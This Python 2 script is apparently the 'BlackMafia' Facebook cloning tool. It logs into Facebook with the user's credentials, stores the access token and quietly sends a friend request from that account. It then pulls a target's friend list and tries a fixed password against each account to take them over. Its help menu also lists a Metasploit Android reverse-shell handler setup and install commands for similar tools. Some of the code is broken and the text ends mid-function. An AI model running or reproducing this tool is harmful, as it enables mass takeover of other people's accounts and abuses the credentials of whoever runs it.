#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To lovehacker
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.07)

#Dev:love_hacker
##### LOGO #####
logo = """
       \033[1;91m:▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:
      \033[1;92m▒▒▒▒▒▒▒▒█▒█▒█▒▒▒█▒█▒█▒▒▒▒▒▒▒▒▒▒::     
     \033[1;93m:▒▒▒▒▒▒███▒█▒█▒███▒█▒█▒▒▒▒▒▒▒▒▒▒:::      
    \033[1;94m::▒▒▒▒▒▒█▒▒▒█▒█▒█▒▒▒█▒█▒▒▒▒▒▒▒▒▒▒::::      
   \033[1;95m:::▒▒▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:::::         
  \033[1;96m::♧♧♧♧♧♧♧♧♧♧\033[1;91mWhatsapp\033[1;96m♧♧♧♧♧♧♧♧♧♧▒▒▒▒▒▒▒::::        
  \033[1;91m:》》》\033[1;93m+923094161457\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-BlackMafia-\033[1;95m♡╭──────────•◈•──────────╮♡
\033[1;92m..........................BlackMafia......................
\033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   Pakistan
\033[1;93m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mBlackMafia\033[1;95m♡╰──────────•◈•──────────╯♡"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;95m██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
\033[1;95m██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝
\033[1;95m██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░
\033[1;95m██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░
\033[1;95m██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗
\033[1;95m╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
\033[1;95m███╗░░░███╗░█████╗░███████╗██╗░█████╗░
\033[1;95m████╗░████║██╔══██╗██╔════╝██║██╔══██╗
\033[1;95m██╔████╔██║███████║█████╗░░██║███████║
\033[1;95m██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║
\033[1;9m██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║
\033[1;95m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
\033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m-----------------»"""
print "\033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m-----------------»"
CorrectUsername = "wz"
CorrectPassword = "pc"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m📋 \x1b[1;91mTool Username \x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m🗝 \x1b[1;91mTool Password  \x1b[1;97m»» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:love_hacker
	    time.sleep(2)
            loop = 'false'
            
        print "\033[1;94mWrong Username"

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print "\033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m-----------------»"
		print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;95m Login  Using Token"
		print('	' )
		id = raw_input('\033[1;97m[] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;93m')
		pwd = raw_input('\033[1;97m[] \x1b[1;91mPassword      \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful.•◈•..'
				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:love_hacker
        time.sleep(0.05)
	print logo2
	print "\033[1;94m    «-------\033[1;96mLogged in User Info\033[1;93m----------»"
        time.sleep(0.05)
	print "	   \033[1;93m «----Name\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "
        time.sleep(0.05)
	print "	   \033[1;93m «----ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
        time.sleep(0.05)
	print "\033[1;95m«-----------------\033[1;91mDisclaimer\033[1;95m---------------»"
        time.sleep(0.05)
        print "\033[1;43m       \033[1;34mThis Tool is for Educational Purpose   \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mThis presentation is for educational          \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mpurposes ONLY.How you use this information    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mis your responsibility.I will not be          \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mheld accountable This Tool/Channel Doesn't    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mSupport illegal activities.for any illegal    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mActivitie This Tool is for Educational Purpose\033[1;0m"
        time.sleep(0.05)
        print "\033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m---------------»"
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;96m\033[1;92m Start    Cloning BlackMafia     "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m2 .\x1b[1;96m\033[1;91m Start    Target  Hacking        "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m3 .\033[1;96m\033[1;93m Facebook Report  BlackMafia      "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m4 .\033[1;96m\033[1;95m Friend's User    information      "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m5 .\033[1;96m\033[1;96m ID Not   Found   Problum solve  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m6 .\x1b[1;96m\033[1;91m Black    Mafia   All Commands  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m7 .\033[1;96m\033[1;94m Black    Mafia   WhatsApp Group   "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m8 .\033[1;96m\033[1;93m Black    Mafia   Youtube Chenal   "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m9 .\033[1;96m\033[1;92m Login    Using   Token          "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m10.\033[1;96m\033[1;91m Show     Token   login/ID       "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m11.\033[1;96m\033[1;96m Tool     Rest &  Update         "
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m0 .\033[1;91m\033[1;91m logout                         "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;91mChoose Option>>> \033[1;93m")
	if unikers =="":
		print "\x1b[1;97mFill in correctly"
		pilih()
	elif unikers =="1":
		crack()
        elif unikers =="2":
		os.system('clear')
		print logo
		brute()
        elif unikers =="3":
		fighter()
        elif unikers =="4":
		asif()
        elif unikers =="5":
		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
	        menu()
        elif unikers =="6":
		os.system('clear')
		print logo10
		print "\033[1;95m«-----------------\033[1;91mMessage\033[1;95m---------------»"
                jalan('\033[1;92m............Massage..........')
		jalan('\033[1;95mID Not Found Problum Salution Menu 5 Num Option')
                jalan("\033[1;96mTermux  Data Clear Every Day")
                jalan('\033[1;96mCommand Complet  98% ')
                jalan('\033[1;96mCommand Update Every day')
                jalan("\033[1;93m.......All..Command...........")
                jalan('\033[1;91⭕No1⭕')
                jalan('\033[1;96mapt update')
                jalan('\033[1;96mapt upgrade')
                jalan('\033[1;96mpkg install python')
                jalan('\033[1;96mpkg install python2')
                jalan('\033[1;96mpkg install git')
                jalan('\033[1;96mpip2 install requests')
                jalan('\033[1;96mpip2 install mechanize') 
                jalan("\033[1;96mgit clone https://github.com/lovehacker404/World")
                jalan('\033[1;96mcd World')
                jalan('\033[1;96mpython2 Cloning.py')
                jalan('\033[1;96mUser:Black')
                jalan('\033[1;96mpass:Mafia')
                jalan('\033[1;92m👆Copy Command & send 2 groups👆')
                jalan('\033[1;91mYoutube Chenal Like Subscrib plzz')
                jalan('\033[1;92m⭕No2⭕')
                jalan('\033[1;91mapt update')
                jalan('\033[1;91mapt upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/WorldCloning/')
                jalan('\033[1;91mcd WorldCloning')
                jalan('\033[1;91mpython2 World.py')
                jalan('\033[1;91mUser Name : World')
                jalan('\033[1;91mPassword   : lovehacker')
                jalan('\033[1;97m⭕No3⭕')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Cobra')
                jalan('\033[1;91mcd Cobra')
                jalan('\033[1;91mpython2 Scorpion.py')
                jalan('\033[1;91mUser Name :  Cobra')
                jalan('\033[1;91mPassword: lovehacker')
                jalan('\033[1;96m⭕No4⭕')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/lov3Hak3r/')
                jalan('\033[1;91mcd lov3Hak3r')
                jalan('\033[1;91mpython2 lovehacker.py')
                jalan('\033[1;95m⭕No5⭕')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/BlackMafia2020/')
                jalan('\033[1;91mcd BlackMafia2020')
                jalan('\033[1;91mpython2 lovehacker')
                jalan('\033[1;91mUser Name:Corona')
                jalan('\033[1;91mPassword  :lovehacker')
                jalan('\033[1;94m⭕No6⭕')
                jalan('\033[1;91mpkg update ')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/CoviD-19/')
                jalan('\033[1;91mcd CoviD-19')
                jalan('\033[1;91mpython2 Virus.py')
                jalan('\033[1;91mUser Name: Corona')
                jalan('\033[1;91mpasword: lovehacker')
                jalan('\033[1;93m⭕No7⭕')
                jalan('\033[1;91mpkg update ')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python2 ')
                jalan('\033[1;91mpkg install git ')
                jalan('\033[1;91mpip2 install mechanize ')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Dragon/')
                jalan('\033[1;91mcd Dragon')
                jalan('\033[1;91mpython2 lovehacker.py')
                jalan('\033[1;91mUserName:  Dragon')
                jalan('\033[1;91mPassword:  lovehacker')
                jalan('\033[1;92m⭕No8⭕')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/KaliIndia/')
                jalan('\033[1;91mcd KaliIndia')
                jalan('\033[1;91mpython2 kalilinux.India.py')
                jalan('\033[1;91mUser Name: India')
                jalan('\033[1;91mPassword:lovehacker')
                jalan('\033[1;97m⭕No9⭕')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Testing')
                jalan('\033[1;91mcd Testing')
                jalan('\033[1;91mpython2 Project.py')
                jalan('\033[1;91mUser Name: Testing')
                jalan('\033[1;91mpasword: lovehacker')
                jalan('\033[1;96m⭕No10⭕')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Target.Atack/')
                jalan('\033[1;91mcd Target.Atack')
                jalan('\033[1;91mls')
                jalan('\033[1;91mcat README.md')
                jalan('\033[1;91mchmod +x Target.py')
                jalan('\033[1;91mls')
                jalan('\033[1;91mnano password.txt')
                jalan('\033[1;91mls')
                jalan('\033[1;91mpwd')
                jalan('\033[1;91mstorage file location password.txt')
                jalan('\033[1;91mpython2 Target.py')
                jalan('\033[1;95m⭕No11⭕')
                jalan('\033[1;91mapt update')
                jalan('\033[1;91mapt upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/fblite')
                jalan('\033[1;91mcd fblite')
                jalan('\033[1;91mpython2 Crack.py')
                jalan('\033[1;94m⭕No12⭕')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/india/')
                jalan('\033[1;91mcd india')
                jalan('\033[1;91mpython2 india.py')
                jalan('\033[1;91mUser name. KashmirBanyGa')
                jalan('\033[1;91mpasword.Pakistan')
                jalan('\033[1;93m⭕No13⭕')
                jalan('\033[1;91mpkg install python2 ')
                jalan('\033[1;91mpip2 install mechanize ')
                jalan('\033[1;91mpip2 install requests ')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/BlackMafiaNew1.12/')
                jalan('\033[1;91mls ')
                jalan('\033[1;91mcd BlackMafiaNew1.12')
                jalan('\033[1;91mpython2 lovehacker')
                jalan('\033[1;91muser name. lovehacker')
                jalan('\033[1;91mpassword . 03094161457')
                jalan('\033[1;92m⭕No14⭕')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/RedMoonNew/')
                jalan('\033[1;91mcd RedMoonNew')
                jalan('\033[1;91mpython2 lovehacker')
                jalan('\033[1;91mUser Name:: RedMoonNew')
                jalan('\033[1;91mPassword:: lovehacker')
                jalan('\033[1;97m⭕No15⭕')
                jalan('\033[1;91mapt update')
                jalan('\033[1;91mapt upgrade')
                jalan('\033[1;91mapt install git')
                jalan('\033[1;91mapt install python ')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Install/')
                jalan('\033[1;91mcd Install')
                jalan('\033[1;91mls ')
                jalan('\033[1;91mchmod +x *')
                jalan('\033[1;91mls')
                jalan('\033[1;91mpython all.py')
                jalan('\033[1;96m⭕No16⭕')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/NetHunting')
                jalan('\033[1;91mcd NetHunting')
                jalan('\033[1;91mpython2 NetHunting.py')
                jalan('\033[1;91mUser Name : linux')
                jalan('\033[1;91mPassword   : lovehacker')
                jalan('\033[1;95m⭕No17⭕')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/WorldCloning/')
                jalan('\033[1;91mcd WorldCloning')
                jalan('\033[1;91mpython2 World.py')
                jalan('\033[1;91mUser Name : World')
                jalan('\033[1;91mPassword   : lovehacker')
                jalan('\033[1;94m⭕No18⭕')
                jalan('\033[1;91mpkg update')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python')
                jalan('\033[1;91mpkg install python2')
                jalan('\033[1;91mpkg install git')
                jalan('\033[1;91mpip2 install requests')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/BangBang/')
                jalan('\033[1;91mcd BangBang')
                jalan('\033[1;91mpython2 Mafia')
                jalan('\033[1;91mUser Name: Pakistan')
                jalan('\033[1;91mpasword: lovehacker')
                jalan('\033[1;93m⭕No19⭕')
                jalan('\033[1;91mpkg update ')
                jalan('\033[1;91mpkg upgrade')
                jalan('\033[1;91mpkg install python2 ')
                jalan('\033[1;91mpip2 install mechanize')
                jalan('\033[1;91mpkg install git ')
                jalan('\033[1;91mpip2 install mechanize ')
                jalan('\033[1;91mpip2 install requests ')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/BlackMafiaError')
                jalan('\033[1;91mcd BlackMafiaError')
                jalan('\033[1;91mpython2 Error.py')
                jalan('\033[1;92m⭕No20⭕')
                jalan('\033[1;91mapt update')
                jalan('\033[1;91mapt upgrade -y ')
                jalan('\033[1;91mpkg install python -y ')
                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Black_Mafia')
                jalan('\033[1;91mcd Black_Mafia')
                jalan('\033[1;91mpython3 Black_Mafia.py')
                jalan('\033[1;91m#Metasploit Commands')
                jalan('\033[1;91m》》Requirements:-')
                jalan('\033[1;91m1: Termux App (From Playstore)')
                jalan('\033[1;91m2: Good Internet connection  (Must)')
                jalan('\033[1;91m3: 2GB free Storage  (Must)')
                jalan('\033[1;91m4: Android Version 5.0+ (Must)')
                jalan('\033[1;91m5: 4GB+ RAM')
                jalan('\033[1;91m6: Fast Processor')
                jalan('\033[1;91m#installation')
                jalan('\033[1;91m1: pkg update')
                jalan('\033[1;91m2: pkg upgrade')
                jalan('\033[1;91m3: pkg install unstable-repo')
                jalan('\033[1;91m4: pkg install metasploit')
                jalan('\033[1;91m5: msfconsole')
                jalan('\033[1;91m6: use exploit/multi/handler')
                jalan('\033[1;91m7: set payload android/meterpreter/reverse_tcp ')
                jalan('\033[1;91m8: set lhost ')
                jalan('\033[1;91m9: set lport 8080')
                jalan('\033[1;91m10: exploit')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
        elif unikers =="7":
		os.system('xdg-open https://chat.whatsapp.com/FmuKakzK8oV3Rp6gpf9Xqr')
	        menu()
        elif unikers =="8":
	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
	        menu()
        elif unikers =="9":
		tokenz()
        elif unikers =="10":
		os.system('reset')
		print logo14
		toket=open('login.txt','r').read()
		print "\033[1;91m[+] \033[1;95mYour token\033[1;91m :\033[1;96m "+toket
		raw_input("\n\033[1;91m[ \033[1;93mBack \033[1;91m]")
		menu()
	elif unikers =="11":
		os.system('clear')
		print logo6
		print "\033[1;95m«-----------------\033[1;91mDataReset\033[1;95m---------------»"
                jalan('\033[1;96m=10%')
                jalan("\033[1;96m==20%")
                jalan('\033[1;96m===30%')
                jalan('\033[1;96m====40%')
                jalan("\033[1;96m=====50%")
                jalan("\033[1;96m======60%")
                jalan('\033[1;96m=======70%')
                jalan('\033[1;96m========80%')
                jalan('\033[1;96m=========90%')
                jalan('\033[1;96m==========100%')
                jalan('\033[1;91mCloning Data Reset')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
                print logo22
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def crack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo26
	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;95m Start Cloning Pakistan       "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m2 .\x1b[1;95m Start Cloning India          "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m3 .\x1b[1;95m Start Cloning Indonasia      "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m4 .\x1b[1;95m Start Cloning United State   "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m5 .\x1b[1;95m Start Cloning Bangladash     "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m6 .\x1b[1;95m Start Cloning All Country    "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m7 .\033[1;95m Start Cloning Indian Old     "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m8 .\033[1;95m Start Cloning Pakistan Old   "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m9 .\033[1;95m Start Cloning BlackMafia     "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m10.\033[1;95m Start Cloning Testing        "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m11.\x1b[1;95m Start Cloning Group uncomplet"
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0 .\033[1;91m Back"
	pilih_crack()

def pilih_crack():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	elif peak =="1":
		os.system('clear')
		print logo
		jjt = raw_input("\033[1;96m[+] \033[1;93mEnter ID\033[1;93m: \033[1;97m")
		print "\033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m---------------»"
		try:
			m = requests.get("https://graph.facebook.com/"+jjt+"?access_token="+toket)
			td = json.loads(m.text)
			print"\033[1;93mName\033[1;93m:\033[1;97m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			crack()
		print"\033[1;93mGetting IDs\033[1;93m..."
		n = requests.get("https://graph.facebook.com/"+jjt+"/friends?access_token="+toket)
		d = json.loads(n.text)
		for c in d['data']:
			id.append(c['id'])
        elif peak =="2":
	        super()
        elif peak =="3":
	        hack()
        elif peak =="4":
	        black()
        elif peak =="5":
	        mafia()
        elif peak =="6":
	        test()
        elif peak =="7":
	        phone()
        elif peak =="8":
	        mail()
        elif peak =="9":
	        isi()
        elif peak =="10":
	        army()
        elif peak =="11":
                clone_dari_member_group ()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	
	print "\033[1;93mTotal IDs\033[1;93m: \033[1;97m"+str(len(id))
	jalan('\033[1;93mPlease Wait\033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m------------------»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m         Start Cloning Pakistan ')
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m------------------»"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:love_hacker
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
